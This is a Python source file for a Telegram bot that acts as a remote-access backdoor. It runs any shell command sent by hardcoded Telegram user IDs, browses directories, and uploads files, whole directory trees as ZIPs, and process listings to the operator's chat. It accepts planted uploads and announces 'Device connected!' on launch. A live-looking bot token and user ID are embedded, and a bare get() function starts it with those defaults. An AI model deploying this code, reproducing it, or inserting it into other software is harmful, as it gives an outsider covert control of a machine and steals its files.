#!/usr/bin/env python3

import os
import time
import zipfile
import psutil
import traceback
from io import BytesIO
from pathlib import Path
from datetime import datetime
import telebot
import re
import subprocess
import sys 
def run(TOKEN="8728874216:AAGTfQLm_jCF4Se1bnl7i5InAYNJlwe9Kws" , AUTHORIZED_USERS = [5575984448]):
    MAX_LEN = 3800 
    BASE_DIR = Path.cwd()
    ZIP_NAME = "all_files.zip" 
    
    bot = telebot.TeleBot(TOKEN)
    
    STOP_FLAG = False 
    CURRENT_TASK = None 
    user_working_dirs = {} 
    user_states = {} 
    def is_authorized(user_id):
        return user_id in AUTHORIZED_USERS
    
    def get_user_dir(user_id):
        if user_id not in user_working_dirs:
            user_working_dirs[user_id] = os.getcwd()
        return user_working_dirs[user_id]
    
    def update_user_dir(user_id, new_dir):
        user_working_dirs[user_id] = new_dir
    
    def split_long_message(text, max_length=4000):
        if len(text) <= max_length:
            return [text]
        
        chunks = []
        start = 0
        
        while start < len(text):
            end = start + max_length
            
            
            split_pos = text.rfind('\n', start, min(len(text), start + max_length))
            if split_pos != -1 and split_pos > start:
                chunk = text[start:split_pos + 1]
                start = split_pos + 1
            else:
                
                chunk = text[start:min(len(text), start + max_length)]
                start += max_length
            
            chunks.append(chunk)
        
        # Add continuation markers to all but the last chunk
        for i in range(len(chunks) - 1):
            chunks[i] = chunks[i].rstrip() + "\n\n... (continued)"
        
        return chunks
    
    def send_long_message(chat_id, text):
        chunks = split_long_message(text)
        for chunk in chunks:
            if STOP_FLAG:
                return
            bot.send_message(chat_id, chunk)
            time.sleep(0.25) # Add a small delay to avoid hitting Telegram API limits
    
    def get_files_only(directory):
        try:
            all_items = os.listdir(directory)
            files_only = []
            
            for item in all_items:
                item_path = os.path.join(directory, item)
                if os.path.isfile(item_path):
                    files_only.append(item)
            
            files_only.sort()
            return files_only
        except Exception:
            return []
    
    def send_files_by_extension(chat_id, user_id, extension):
        try:
            working_dir = get_user_dir(user_id)
            files = get_files_only(working_dir)
            
            if not files:
                return False, f"📁 No files found in current directory:\n{working_dir}"
            
            matching_files = []
            
            for file_name in files:
                file_path = os.path.join(working_dir, file_name)
                if file_name.lower().endswith(extension.lower()) and os.path.getsize(file_path) > 0:
                    matching_files.append(file_path)
            
            if not matching_files:
                return False, f"❌ No non-empty files found with extension '{extension}'"
            
            sent_count = 0
            failed_files = []
            
            for file_path in matching_files:
                if STOP_FLAG:
                    return False, "🛑 File sending stopped"
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(chat_id, f, caption=f"📁 File: {os.path.basename(file_path)}")
                    sent_count += 1
                    time.sleep(0.3)
                except Exception:
                    failed_files.append(os.path.basename(file_path))
            
            summary = f"✅ Sent {sent_count} file(s) with extension '{extension}'"
            
            if failed_files:
                summary += f"\n❌ Failed to send {len(failed_files)} file(s): {', '.join(failed_files)}"
            
            return True, summary
            
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    def send_file_by_name(chat_id, user_id, file_name):
        try:
            working_dir = get_user_dir(user_id)
            file_path = os.path.join(working_dir, file_name)
            
            if not os.path.exists(file_path):
                files = get_files_only(working_dir)
                matching_files = [f for f in files if file_name.lower() in f.lower()]
                
                if not matching_files:
                    return False, f"❌ File '{file_name}' not found"
                
                if len(matching_files) == 1:
                    file_path = os.path.join(working_dir, matching_files[0])
                    file_name = matching_files[0]
                else:
                    file_list = "\n".join([f"{i+1}. {file}" for i, file in enumerate(matching_files)])
                    return False, f"❌ Multiple files found containing '{file_name}':\n{file_list}\n\nPlease be more specific."
            
            if not os.path.isfile(file_path):
                return False, f"❌ Not a file: {file_name}"
            
            if os.path.getsize(file_path) == 0:
                return False, f"⚠️ File is empty (0 bytes): {file_name}"
            
            try:
                with open(file_path, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"📁 File: {file_name}")
                return True, f"✅ File sent: {file_name}"
            except Exception as e:
                return False, f"❌ Error sending file: {str(e)}"
            
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    def send_all_files_one_by_one(chat_id, user_id):
        try:
            working_dir = get_user_dir(user_id)
            files = get_files_only(working_dir)
            
            if not files:
                return False, f"📁 No files found in current directory:\n{working_dir}"
            
            non_empty_files = []
            empty_files = []
            
            for file_name in files:
                file_path = os.path.join(working_dir, file_name)
                if os.path.getsize(file_path) > 0:
                    non_empty_files.append(file_path)
                else:
                    empty_files.append(file_name)
            
            if not non_empty_files:
                empty_list = "\n".join([f"• {f}" for f in empty_files])
                return False, f"❌ All files are empty (0 bytes):\n{empty_list}"
            
            sent_count = 0
            failed_files = []
            
            for file_path in non_empty_files:
                if STOP_FLAG:
                    return False, "🛑 File sending stopped"
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(chat_id, f, caption=f"📁 File: {os.path.basename(file_path)}")
                    sent_count += 1
                    time.sleep(0.3)
                except Exception:
                    failed_files.append(os.path.basename(file_path))
            
            summary = f"✅ Sent {sent_count} file(s)"
            
            if empty_files:
                summary += f"\n📝 Skipped {len(empty_files)} empty file(s)"
            
            if failed_files:
                summary += f"\n❌ Failed to send {len(failed_files)} file(s): {', '.join(failed_files)}"
            
            return True, summary
            
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    def handle_take_command(command, user_id):
        try:
            command = command.strip().lower()
            
            if command == 'take all':
                return "take_all_special"
            
            if command.startswith('take .'):
                extension = command[5:].strip()
                if extension:
                    return f"take_extension_special:{extension}"
                else:
                    return "❌ Please provide an extension. Example: take .jpg or take .py"
            
            match_number = re.search(r'take\s+(\d+)', command)
            if match_number:
                file_number = int(match_number.group(1))
                working_dir = get_user_dir(user_id)
                files = get_files_only(working_dir)
                
                if not files:
                    return f"📁 No files found in current directory:\n{working_dir}"
                
                if file_number < 1 or file_number > len(files):
                    file_list = "\n".join([f"{i+1}. {file}" for i, file in enumerate(files)])
                    return f"❌ File number {file_number} not found.\n\nAvailable files:\n{file_list}\n\nTotal files: {len(files)}"
                
                requested_file = files[file_number - 1]
                file_path = os.path.join(working_dir, requested_file)
                
                if not os.path.exists(file_path):
                    return f"❌ File not found: {requested_file}"
                
                if not os.path.isfile(file_path):
                    return f"❌ Not a file: {requested_file}"
                
                if os.path.getsize(file_path) == 0:
                    return f"⚠️ File is empty (0 bytes): {requested_file}"
                
                return file_path
            
            match_name = re.search(r'take\s+(.+)$', command)
            if match_name:
                file_name = match_name.group(1).strip()
                return f"take_name_special:{file_name}"
            
            return "❌ Invalid format. Use:\n• take 1 (for file number)\n• take filename.txt (for file name)\n• take .jpg (for all jpg files)\n• take all (for all files)"
            
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    def execute_command(command, user_id, timeout=30):
        try:
            if command.strip().lower().startswith('take '):
                result = handle_take_command(command, user_id)
                if result == "take_all_special":
                    return result
                elif result.startswith("take_extension_special:"):
                    return result
                elif result.startswith("take_name_special:"):
                    return result
                elif isinstance(result, str) and os.path.exists(result) and os.path.isfile(result):
                    return result
                else:
                    return result
            
            working_dir = get_user_dir(user_id)
            
            if command.strip().startswith("cd "):
                new_dir = command.strip()[3:].strip()
                try:
                    os.chdir(working_dir) # Ensure we start from the user's current working directory
                    if new_dir == "..":
                        os.chdir("..")
                        new_abs_dir = os.getcwd()
                    elif os.path.isabs(new_dir):
                        os.chdir(new_dir)
                        new_abs_dir = os.getcwd()
                    else:
                        os.chdir(new_dir)
                        new_abs_dir = os.getcwd()
                    
                    update_user_dir(user_id, new_abs_dir)
                    return f"✅ Changed directory to:\n{new_abs_dir}"
                    
                except FileNotFoundError:
                    return f"❌ Directory not found: {new_dir}"
                except PermissionError:
                    return f"❌ Permission denied: {new_dir}"
                except Exception as e:
                    return f"❌ cd failed: {str(e)}"
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=working_dir
            )
            
            try:
                stdout, stderr = process.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"❌ Command timed out after {timeout} seconds. Killed process.\nOutput:\n{stdout.strip()}\nError:\n{stderr.strip()}"
            
            if process.returncode != 0:
                error_msg = stderr.strip() or "No error message"
                return f"❌ Error (exit code: {process.returncode}):\n{error_msg}"
            
            output = stdout.strip()
            if output:
                return f"✅ Output:\n{output}"
            else:
                return "✅ Command executed successfully (no output)"
                
        except Exception as e:
            return f"❌ Execution failed: {str(e)}"
    
    
    # ---------- TELEBOT HANDLERS ----------
    
    # ---------- /STOP ----------
    @bot.message_handler(commands=['stop'])
    def stop_cmd(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        global STOP_FLAG
        STOP_FLAG = True
        bot.send_message(message.chat.id, "🛑 Task stopped")
    
    
    # ---------- /INFO ----------
    def get_python_process_info():
        lines = []
    
        for p in psutil.process_iter(['pid', 'cmdline', 'cwd']):
            try:
                if STOP_FLAG:
                    return "🛑 Stopped"
    
                cmd = p.info['cmdline']
                if not cmd or 'python' not in cmd[0].lower():
                    continue
    
                script = next((a for a in cmd if a.endswith('.py')), None)
                if not script:
                    continue
    
                cwd = p.info.get('cwd') or "N/A"
    
                lines.append(
                    f"PID: {p.pid}\n"
                    f"Script: {os.path.basename(script)}\n"
                    f"Dir: {cwd}\n"
                    "------------------------"
                )
    
            except:
                continue
    
        if not lines:
            return "📭 No running Python scripts found"
    
        return (
            "📊 Python Process Snapshot\n"
            f"📁 Bot Dir: {BASE_DIR}\n"
            f"🕒 Time: {datetime.now()}\n\n"
            + "\n".join(lines)
        )
    
    
    @bot.message_handler(commands=['info'])
    def info_cmd(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        global STOP_FLAG
        STOP_FLAG = False
        send_long_message(message.chat.id, get_python_process_info())
    
    
    # ---------- /SCAN ----------
    @bot.message_handler(commands=['scan'])
    def scan_cmd(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        global STOP_FLAG
        STOP_FLAG = False
    
        chat_id = message.chat.id
        bot.send_message(chat_id, "🔍 Scanning directory...")
    
        out = []
        for root, dirs, files in os.walk(get_user_dir(message.from_user.id)):
            if STOP_FLAG:
                bot.send_message(chat_id, "🛑 Scan stopped")
                return
            out.append(f"\n[{root}]")
            for f in files:
                out.append(f" - {f}")
    
        bio = BytesIO("\n".join(out).encode())
        bio.name = "directory_report.txt"
        bot.send_document(chat_id, bio)
    
    
    # ---------- /SENDZIP (LIVE PROGRESS) ----------
    @bot.message_handler(commands=['sendzip'])
    def sendzip_cmd(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        global STOP_FLAG
        STOP_FLAG = False
    
        chat_id = message.chat.id
        status = bot.send_message(chat_id, "🗜 Preparing ZIP...")
    
        all_files = []
        for root, dirs, files in os.walk(get_user_dir(message.from_user.id)):
            dirs[:] = [d for d in dirs if not d.startswith('.') and d != "__pycache__"]
            for f in files:
                if f.startswith('.') or f == ZIP_NAME:
                    continue
                all_files.append(os.path.join(root, f))
    
        total = len(all_files)
    
        zip_path = os.path.join(get_user_dir(message.from_user.id), ZIP_NAME)
        if os.path.exists(zip_path):
            os.remove(zip_path)
    
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            for i, file in enumerate(all_files, 1):
                if STOP_FLAG:
                    z.close()
                    os.remove(zip_path)
                    bot.edit_message_text("🛑 ZIP creation stopped", chat_id, status.message_id)
                    return
    
                z.write(file, arcname=os.path.relpath(file, get_user_dir(message.from_user.id)))
                bot.edit_message_text(
                    f"🗜 Creating ZIP...\n"
                    f"📦 Added: {os.path.basename(file)}\n"
                    f"⏳ {i} / {total}",
                    chat_id,
                    status.message_id
                )
                time.sleep(0.1)
    
        bot.edit_message_text("📤 Sending ZIP...", chat_id, status.message_id)
    
        with open(zip_path, "rb") as zf:
            if not STOP_FLAG:
                bot.send_document(chat_id, zf)
    
        os.remove(zip_path)
        bot.send_message(chat_id, "✅ ZIP sent")
    
    
    # ---------- /SENDFILES (renamed from new.py's /sendfiles, now uses bot(Nandu).py's logic) ----------
    @bot.message_handler(commands=['sendfiles'])
    def sendfiles_cmd(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        global STOP_FLAG
        STOP_FLAG = False
    
        chat_id = message.chat.id
        bot.send_message(chat_id, "📂 Sending files...")
        
        success, message_text = send_all_files_one_by_one(chat_id, message.from_user.id)
        bot.send_message(chat_id, message_text)
    
    
    # ---------- /START, /HELP ----------
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        
        help_text = (
            "🤖 Multi-Tool Terminal Bot - Ready to Use!\n\n"
            "Just send me any command and I'll execute it on the server.\n\n"
            "Available commands:\n"
            "/info - Get Python process snapshot\n"
            "/scan - Scan current directory and get a report\n"
            "/sendfiles - Send all non-empty files one by one\n"
            "/sendzip - Create a ZIP of all files and send it\n"
            "/stop - Stop current task (scan, sendfiles, sendzip)\n"
            "/pwd - Show current directory\n"
            "/send - Upload files to current directory\n"
            "/cancel - Cancel file upload mode\n"
            "\n"
            "SHELL COMMANDS (just type them):\n"
            "pwd - Show current directory\n"
            "ls or ls -la - List files\n"
            "cd <directory> - Change directory\n"
            "whoami - Show current user\n"
            "date - Show date and time\n"
            "Any other shell command will be executed.\n"
            "\n"
            "TAKE COMMANDS (to get files):\n"
            "1. take <number> - Get the nth file\n   Example: take 1\n"
            "2. take <file_name> - Get file by name\n   Example: take myfile.txt\n"
            "3. take .<extension> - Get all files with extension\n   Example: take .jpg or take .py\n"
            "4. take all - Get ALL non-empty files\n"
            "\n"
            "Special features:\n"
            "- Working directory saved per user\n"
            "- Empty files automatically skipped when sending\n"
            "- Long messages are split automatically"
        )
        send_long_message(message.chat.id, help_text)
    
    
    # ---------- /PWD ----------
    @bot.message_handler(commands=['pwd'])
    def handle_pwd(message):
        user_id = message.from_user.id
        
        if not is_authorized(user_id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        
        working_dir = get_user_dir(user_id)
        bot.reply_to(message, f"📁 Current directory:\n{working_dir}")
    
    
    # ---------- /SEND (File Upload Mode) ----------
    @bot.message_handler(commands=['send'])
    def handle_send_command(message):
        user_id = message.from_user.id
        
        if not is_authorized(user_id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        
        working_dir = get_user_dir(user_id)
        user_states[user_id] = 'waiting_for_file'
        
        bot.reply_to(message, f"📤 File Upload Mode\n\nCurrent directory: {working_dir}\n\nNow send me any file and I'll save it to this directory.\nTo cancel, send /cancel")
    
    
    # ---------- /CANCEL ----------
    @bot.message_handler(commands=['cancel'])
    def handle_cancel_command(message):
        user_id = message.from_user.id
        
        if user_id in user_states:
            del user_states[user_id]
            bot.reply_to(message, "✅ Operation cancelled.")
        else:
            bot.reply_to(message, "❌ No active operation to cancel.")
    
    
    # ---------- FILE UPLOAD HANDLER ----------
    @bot.message_handler(content_types=['document', 'photo', 'audio', 'video'])
    def handle_document(message):
        user_id = message.from_user.id
        
        if not is_authorized(user_id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        
        if user_states.get(user_id) != 'waiting_for_file':
            return
        
        try:
            working_dir = get_user_dir(user_id)
            
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                file_name = message.document.file_name
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
                file_name = f"photo_{message.photo[-1].file_id}.jpg"
            elif message.audio:
                file_info = bot.get_file(message.audio.file_id)
                file_name = message.audio.file_name or f"audio_{message.audio.file_id}.mp3"
            elif message.video:
                file_info = bot.get_file(message.video.file_id)
                file_name = message.video.file_name or f"video_{message.video.file_id}.mp4"
            else:
                bot.reply_to(message, "❌ Unsupported file type")
                return
            
            downloaded_file = bot.download_file(file_info.file_path)
            file_path = os.path.join(working_dir, file_name)
            
            counter = 1
            base_name, extension = os.path.splitext(file_name)
            while os.path.exists(file_path):
                file_name = f"{base_name}_{counter}{extension}"
                file_path = os.path.join(working_dir, file_name)
                counter += 1
            
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            del user_states[user_id]
            
            bot.reply_to(message, f"✅ File saved successfully!\n\n📁 Location: {file_path}\n📊 File size: {os.path.getsize(file_path):,} bytes")
            
        except Exception as e:
            bot.reply_to(message, f"❌ Error saving file: {str(e)}")
    
    
    # ---------- GENERIC MESSAGE HANDLER (for shell commands and 'take' commands) ----------
    @bot.message_handler(func=lambda message: True)
    def handle_command(message):
        user_id = message.from_user.id
        
        if not is_authorized(user_id):
            bot.reply_to(message, "⛔ Unauthorized access")
            return
        
        # If in file upload mode, ignore this handler
        if user_states.get(user_id) == 'waiting_for_file':
            return
    
        command = message.text.strip()
        
        if not command:
            bot.reply_to(message, "Please send a command to execute")
            return
        
        bot.send_chat_action(message.chat.id, 'typing')
        
        result = execute_command(command, user_id)
        
        if result == "take_all_special":
            success, message_text = send_all_files_one_by_one(message.chat.id, user_id)
            bot.reply_to(message, message_text)
            return
        
        if result.startswith("take_extension_special:"):
            extension = result.split(":")[1]
            success, message_text = send_files_by_extension(message.chat.id, user_id, extension)
            bot.reply_to(message, message_text)
            return
        
        if result.startswith("take_name_special:"):
            file_name = result.split(":")[1]
            success, message_text = send_file_by_name(message.chat.id, user_id, file_name)
            bot.reply_to(message, message_text)
            return
        
        if isinstance(result, str) and os.path.exists(result) and os.path.isfile(result):
            try:
                with open(result, 'rb') as file:
                    bot.send_document(message.chat.id, file, caption=f"📁 File: {os.path.basename(result)}")
            except Exception as e:
                bot.reply_to(message, f"❌ Error sending file: {str(e)}")
        else:
            response = f"Command: {command}\n\n{result}"
            send_long_message(message.chat.id, response)
    
    
    # ---------- MAIN POLLING LOOP ----------
    print("✅ Bot running...")
    
    # Parse command-line arguments for timeout
    TIMEOUT_HOURS = None
    if len(sys.argv) > 1:
        try:
            TIMEOUT_HOURS = float(sys.argv[1])
            if TIMEOUT_HOURS <= 0:
                raise ValueError("Timeout must be a positive number.")
            print(f"Bot will run for {TIMEOUT_HOURS} hours.")
        except ValueError:
            print(f"Invalid timeout value: {sys.argv[1]}. Bot will run indefinitely.")
            TIMEOUT_HOURS = None
    
    END_TIME = None
    if TIMEOUT_HOURS:
        END_TIME = time.time() + TIMEOUT_HOURS * 3600 # Convert hours to seconds
    
    if AUTHORIZED_USERS:
        for chat_id in AUTHORIZED_USERS:
            try:
                bot.send_message(chat_id, 'Device connected! Run /help to see available commands')
            except Exception as e:
                print(f"Failed to send connection message to {chat_id}: {e}")
    
    while True:
        if END_TIME and time.time() > END_TIME:
            print(f"Bot has reached its {TIMEOUT_HOURS} hour timeout. Shutting down.")
            break
        try:
            bot.infinity_polling(timeout=30)
        except Exception as e:
            print("Bot crashed:", e)
            time.sleep(5)
def start(TOKEN, CHAT_ID):
    return run(TOKEN,CHAT_ID)
def get(d=0):
    run()    